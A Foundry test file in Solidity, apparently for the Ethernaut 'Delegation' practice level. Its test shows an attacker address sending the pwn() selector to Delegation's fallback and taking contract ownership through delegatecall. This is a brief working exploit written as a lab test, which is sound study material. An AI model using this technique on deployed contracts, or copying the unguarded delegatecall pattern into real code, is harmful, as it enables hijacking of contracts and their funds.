// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../../src/Delegation.sol";

contract DelegationTest is Test {
    Delegation delegation;
    Delegate delegate;

    address TEST_USER_OWNER = makeAddr("userOwner");
    address TEST_USER_ATTACKER = makeAddr("userAttacker");
    uint256 constant STARTTING_BALANCE = 100 ether;

    function setUp() external {
        vm.deal(TEST_USER_OWNER, STARTTING_BALANCE);
        vm.deal(TEST_USER_ATTACKER, STARTTING_BALANCE);

        vm.startPrank(TEST_USER_OWNER);
        delegate = new Delegate(TEST_USER_OWNER);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function testOwnerIsSender() public {
        assertEq(delegate.owner(), TEST_USER_OWNER);
    }

    function testAttackerChangeOwner() public {
        vm.startPrank(TEST_USER_ATTACKER);
        (bool output,) = address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(output, "Fail call");
        vm.stopPrank();

        assertEq(delegation.owner(), TEST_USER_ATTACKER);
    }
}
